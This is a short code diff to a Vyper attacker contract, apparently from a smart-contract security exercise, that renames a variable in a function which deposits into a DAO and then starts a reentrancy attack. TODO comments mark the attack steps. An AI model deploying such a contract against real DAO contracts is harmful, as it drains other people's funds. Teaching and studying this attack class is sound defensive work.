@@ -21,21 +21,23 @@ def _attack() -> bool:
       DAO(self.dao_address).withdraw()
     else:
         pass
+
     return True
 
 @external
 @payable
 def attack(dao_address:address):
     self.dao_address = dao_address
-    deposit_amount: uint256 = msg.value    
+    
+    amount_deposited: uint256 = msg.value    
     
     # Attack cannot withdraw more than what exists in the DAO
     if dao_address.balance < msg.value:
-        deposit_amount = dao_address.balance
+        amount_deposited = dao_address.balance
     
     # TODO: make the deposit into the DAO   
     self.owner_address = msg.sender 
-    DAO(self.dao_address).deposit(value = deposit_amount)
+    DAO(self.dao_address).deposit(value = amount_deposited)
     # TODO: Start the reentrancy attack
     self._attack()
 
